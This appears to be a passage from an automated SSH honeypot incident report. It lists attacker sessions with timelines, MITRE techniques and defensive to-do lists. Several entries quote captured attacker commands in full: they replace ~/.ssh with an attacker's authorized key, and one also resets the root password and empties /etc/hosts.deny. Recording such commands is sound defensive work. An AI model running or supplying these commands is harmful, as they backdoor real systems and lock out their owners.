| **Last Seen** | 2026-04-16 18:52 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:52:24` | `cowrie.session.connect` |
| `2026-04-16 18:52:24` | `cowrie.client.version` |
| `2026-04-16 18:52:25` | `cowrie.client.kex` |
| `2026-04-16 18:52:26` | `cowrie.login.success` |
| `2026-04-16 18:52:28` | `cowrie.session.params` |
| `2026-04-16 18:52:28` | `cowrie.command.input` |
| `2026-04-16 18:52:28` | `cowrie.command.failed` |
| `2026-04-16 18:52:28` | `cowrie.log.closed` |
| `2026-04-16 18:52:30` | `cowrie.session.params` |
| `2026-04-16 18:52:30` | `cowrie.command.input` |
| `2026-04-16 18:52:31` | `cowrie.session.file_download` |
| `2026-04-16 18:52:31` | `cowrie.log.closed` |
| `2026-04-16 18:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e85622a7452

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 18:52 |
| **Last Seen** | 2026-04-16 18:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:52:39` | `cowrie.session.connect` |
| `2026-04-16 18:52:41` | `cowrie.client.version` |
| `2026-04-16 18:52:44` | `cowrie.client.kex` |
| `2026-04-16 18:52:46` | `cowrie.login.success` |
| `2026-04-16 18:52:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a916a4d2e0

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 18:56 |
| **Last Seen** | 2026-04-16 18:57 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:56:36` | `cowrie.session.connect` |
| `2026-04-16 18:56:36` | `cowrie.client.version` |
| `2026-04-16 18:56:36` | `cowrie.client.kex` |
| `2026-04-16 18:56:39` | `cowrie.login.success` |
| `2026-04-16 18:56:41` | `cowrie.session.params` |
| `2026-04-16 18:56:41` | `cowrie.command.input` |
| `2026-04-16 18:56:41` | `cowrie.command.failed` |
| `2026-04-16 18:56:47` | `cowrie.log.closed` |
| `2026-04-16 18:56:48` | `cowrie.session.params` |
| `2026-04-16 18:56:48` | `cowrie.command.input` |
| `2026-04-16 18:56:50` | `cowrie.session.file_download` |
| `2026-04-16 18:56:50` | `cowrie.log.closed` |
| `2026-04-16 18:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c13c5d1d556e

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 18:57 |
| **Last Seen** | 2026-04-16 18:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 18:57:00` | `cowrie.session.connect` |
| `2026-04-16 18:57:00` | `cowrie.client.version` |
| `2026-04-16 18:57:00` | `cowrie.client.kex` |
| `2026-04-16 18:57:03` | `cowrie.login.success` |
| `2026-04-16 18:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4957ecce9bfb

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:00 |
| **Last Seen** | 2026-04-16 19:01 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:00:40` | `cowrie.session.connect` |
| `2026-04-16 19:00:40` | `cowrie.client.version` |
| `2026-04-16 19:00:41` | `cowrie.client.kex` |
| `2026-04-16 19:00:45` | `cowrie.login.success` |
| `2026-04-16 19:00:47` | `cowrie.session.params` |
| `2026-04-16 19:00:47` | `cowrie.command.input` |
| `2026-04-16 19:00:47` | `cowrie.command.failed` |
| `2026-04-16 19:00:47` | `cowrie.log.closed` |
| `2026-04-16 19:00:51` | `cowrie.session.params` |
| `2026-04-16 19:00:51` | `cowrie.command.input` |
| `2026-04-16 19:00:51` | `cowrie.session.file_download` |
| `2026-04-16 19:00:51` | `cowrie.log.closed` |
| `2026-04-16 19:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ba9aad531a

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:00 |
| **Last Seen** | 2026-04-16 19:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:00:58` | `cowrie.session.connect` |
| `2026-04-16 19:00:58` | `cowrie.client.version` |
| `2026-04-16 19:00:58` | `cowrie.client.kex` |
| `2026-04-16 19:01:02` | `cowrie.login.success` |
| `2026-04-16 19:01:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e05d1ab01b3

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:04 |
| **Last Seen** | 2026-04-16 19:04 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:04:36` | `cowrie.session.connect` |
| `2026-04-16 19:04:37` | `cowrie.client.version` |
| `2026-04-16 19:04:38` | `cowrie.client.kex` |
| `2026-04-16 19:04:40` | `cowrie.login.success` |
| `2026-04-16 19:04:42` | `cowrie.session.params` |
| `2026-04-16 19:04:42` | `cowrie.command.input` |
| `2026-04-16 19:04:42` | `cowrie.command.failed` |
| `2026-04-16 19:04:43` | `cowrie.log.closed` |
| `2026-04-16 19:04:43` | `cowrie.session.params` |
| `2026-04-16 19:04:43` | `cowrie.command.input` |
| `2026-04-16 19:04:44` | `cowrie.session.file_download` |
| `2026-04-16 19:04:44` | `cowrie.log.closed` |
| `2026-04-16 19:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d1fef9bf1c4

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:04 |
| **Last Seen** | 2026-04-16 19:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:04:51` | `cowrie.session.connect` |
| `2026-04-16 19:04:51` | `cowrie.client.version` |
| `2026-04-16 19:04:52` | `cowrie.client.kex` |
| `2026-04-16 19:04:56` | `cowrie.login.success` |
| `2026-04-16 19:04:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f34af49e1ea

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:16 |
| **Last Seen** | 2026-04-16 19:17 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:16:48` | `cowrie.session.connect` |
| `2026-04-16 19:16:48` | `cowrie.client.version` |
| `2026-04-16 19:16:49` | `cowrie.client.kex` |
| `2026-04-16 19:16:50` | `cowrie.login.success` |
| `2026-04-16 19:16:51` | `cowrie.session.params` |
| `2026-04-16 19:16:51` | `cowrie.command.input` |
| `2026-04-16 19:16:51` | `cowrie.command.failed` |
| `2026-04-16 19:16:53` | `cowrie.log.closed` |
| `2026-04-16 19:16:54` | `cowrie.session.params` |
| `2026-04-16 19:16:54` | `cowrie.command.input` |
| `2026-04-16 19:16:54` | `cowrie.session.file_download` |
| `2026-04-16 19:16:54` | `cowrie.log.closed` |
| `2026-04-16 19:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c500974c0bd

| Field | Detail |
|---|---|
| **Source IP** | `172.174.17[.]234` |
| **First Seen** | 2026-04-16 19:17 |
| **Last Seen** | 2026-04-16 19:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:17:01` | `cowrie.session.connect` |
| `2026-04-16 19:17:04` | `cowrie.client.version` |
| `2026-04-16 19:17:04` | `cowrie.client.kex` |
| `2026-04-16 19:17:11` | `cowrie.login.success` |
| `2026-04-16 19:17:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.174.17[.]234` to AbuseIPDB if not already reported
- [ ] Block `172.174.17[.]234` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f467e000c90f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.141[.]34` |
| **First Seen** | 2026-04-16 19:21 |
| **Last Seen** | 2026-04-16 19:21 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:Ws3xolYofASl"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:21:26` | `cowrie.session.connect` |
| `2026-04-16 19:21:26` | `cowrie.client.version` |
| `2026-04-16 19:21:26` | `cowrie.client.kex` |
| `2026-04-16 19:21:27` | `cowrie.login.success` |
| `2026-04-16 19:21:27` | `cowrie.session.params` |
| `2026-04-16 19:21:27` | `cowrie.command.input` |
| `2026-04-16 19:21:27` | `cowrie.command.failed` |
| `2026-04-16 19:21:27` | `cowrie.log.closed` |
| `2026-04-16 19:21:28` | `cowrie.session.params` |
| `2026-04-16 19:21:28` | `cowrie.command.input` |
| `2026-04-16 19:21:28` | `cowrie.session.file_download` |
| `2026-04-16 19:21:28` | `cowrie.log.closed` |
| `2026-04-16 19:21:44` | `cowrie.session.params` |
| `2026-04-16 19:21:44` | `cowrie.command.input` |
| `2026-04-16 19:21:44` | `cowrie.log.closed` |
| `2026-04-16 19:21:45` | `cowrie.session.params` |
| `2026-04-16 19:21:45` | `cowrie.command.input` |
| `2026-04-16 19:21:45` | `cowrie.log.closed` |
| `2026-04-16 19:21:45` | `cowrie.session.params` |
| `2026-04-16 19:21:45` | `cowrie.command.input` |
| `2026-04-16 19:21:45` | `cowrie.session.file_download` |
| `2026-04-16 19:21:45` | `cowrie.log.closed` |
| `2026-04-16 19:21:46` | `cowrie.session.params` |
| `2026-04-16 19:21:46` | `cowrie.command.input` |
| `2026-04-16 19:21:46` | `cowrie.log.closed` |
| `2026-04-16 19:21:46` | `cowrie.session.params` |
| `2026-04-16 19:21:46` | `cowrie.command.input` |
| `2026-04-16 19:21:47` | `cowrie.log.closed` |
| `2026-04-16 19:21:47` | `cowrie.session.params` |
| `2026-04-16 19:21:47` | `cowrie.command.input` |
| `2026-04-16 19:21:47` | `cowrie.command.input` |
| `2026-04-16 19:21:47` | `cowrie.log.closed` |
| `2026-04-16 19:21:47` | `cowrie.session.params` |
| `2026-04-16 19:21:47` | `cowrie.command.input` |
| `2026-04-16 19:21:48` | `cowrie.log.closed` |
| `2026-04-16 19:21:48` | `cowrie.session.params` |
| `2026-04-16 19:21:48` | `cowrie.command.input` |
| `2026-04-16 19:21:48` | `cowrie.log.closed` |
| `2026-04-16 19:21:48` | `cowrie.session.params` |
| `2026-04-16 19:21:48` | `cowrie.command.input` |
| `2026-04-16 19:21:49` | `cowrie.log.closed` |
| `2026-04-16 19:21:49` | `cowrie.session.params` |
| `2026-04-16 19:21:49` | `cowrie.command.input` |
| `2026-04-16 19:21:49` | `cowrie.log.closed` |
| `2026-04-16 19:21:49` | `cowrie.session.params` |
| `2026-04-16 19:21:49` | `cowrie.command.input` |
| `2026-04-16 19:21:50` | `cowrie.log.closed` |
| `2026-04-16 19:21:50` | `cowrie.session.params` |
| `2026-04-16 19:21:50` | `cowrie.command.input` |
| `2026-04-16 19:21:50` | `cowrie.log.closed` |
| `2026-04-16 19:21:51` | `cowrie.session.params` |
| `2026-04-16 19:21:51` | `cowrie.command.input` |
| `2026-04-16 19:21:51` | `cowrie.log.closed` |
| `2026-04-16 19:21:51` | `cowrie.session.params` |
| `2026-04-16 19:21:51` | `cowrie.command.input` |
| `2026-04-16 19:21:51` | `cowrie.log.closed` |
| `2026-04-16 19:21:52` | `cowrie.session.params` |
| `2026-04-16 19:21:52` | `cowrie.command.input` |
| `2026-04-16 19:21:52` | `cowrie.log.closed` |
| `2026-04-16 19:21:52` | `cowrie.session.params` |
| `2026-04-16 19:21:52` | `cowrie.command.input` |
| `2026-04-16 19:21:52` | `cowrie.log.closed` |
| `2026-04-16 19:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.126.141[.]34` to AbuseIPDB if not already reported
- [ ] Block `101.126.141[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d593d53f39db

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-04-16 19:21 |
| **Last Seen** | 2026-04-16 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:21:57` | `cowrie.session.connect` |
| `2026-04-16 19:21:57` | `cowrie.client.version` |
| `2026-04-16 19:21:57` | `cowrie.client.kex` |
| `2026-04-16 19:21:57` | `cowrie.login.success` |
| `2026-04-16 19:21:57` | `cowrie.session.params` |
| `2026-04-16 19:21:57` | `cowrie.command.input` |
| `2026-04-16 19:21:57` | `cowrie.command.failed` |
| `2026-04-16 19:21:57` | `cowrie.log.closed` |
| `2026-04-16 19:21:57` | `cowrie.session.params` |
| `2026-04-16 19:21:57` | `cowrie.command.input` |
| `2026-04-16 19:21:57` | `cowrie.session.file_download` |
| `2026-04-16 19:21:57` | `cowrie.log.closed` |
| `2026-04-16 19:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-403875fb3f7e

| Field | Detail |
|---|---|
| **Source IP** | `43.227.185[.]238` |
| **First Seen** | 2026-04-16 19:21 |
| **Last Seen** | 2026-04-16 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 19:21:59` | `cowrie.session.connect` |
| `2026-04-16 19:21:59` | `cowrie.client.version` |
| `2026-04-16 19:21:59` | `cowrie.client.kex` |
| `2026-04-16 19:21:59` | `cowrie.login.success` |
| `2026-04-16 19:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.227.185[.]238` to AbuseIPDB if not already reported
- [ ] Block `43.227.185[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.174.17[.]234` | **8** | 2026-04-16 18:47 | 2026-04-16 19:21 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `185.93.89[.]192` | **3** | 2026-04-16 18:36 | 2026-04-16 18:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.141[.]34` | **2** | 2026-04-16 19:21 | 2026-04-16 19:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.143.231[.]2` | 1 | 2026-04-16 19:21 | 2026-04-16 19:21 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.23.199[.]119` | 1 | 2026-04-16 18:45 | 2026-04-16 18:45 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `119.148.49[.]82` | 1 | 2026-04-16 19:12 | 2026-04-16 19:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `152.32.130[.]144` | 1 | 2026-04-16 18:46 | 2026-04-16 18:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `165.154.205[.]128` | 1 | 2026-04-16 18:46 | 2026-04-16 18:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.228.117[.]84` | 1 | 2026-04-16 18:14 | 2026-04-16 18:15 | 30s | 0 | `T1592` | 🟢 LOW |
| `185.93.89[.]190` | 1 | 2026-04-16 18:36 | 2026-04-16 18:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]98` | 1 | 2026-04-16 19:04 | 2026-04-16 19:04 | 4s | 0 | `T1592` | 🟢 LOW |
| `209.14.88[.]118` | 1 | 2026-04-16 18:44 | 2026-04-16 18:44 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.107.156[.]227` | 1 | 2026-04-16 18:43 | 2026-04-16 18:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.109.140[.]250` | 1 | 2026-04-16 18:46 | 2026-04-16 18:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `43.130.90[.]166` | 1 | 2026-04-16 18:48 | 2026-04-16 18:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.227.185[.]238` | 1 | 2026-04-16 19:21 | 2026-04-16 19:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.249.247[.]165` | 1 | 2026-04-16 19:20 | 2026-04-16 19:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.20.236[.]52` | 1 | 2026-04-16 18:49 | 2026-04-16 18:51 | 120s | 0 | `T1592` | 🟢 LOW |
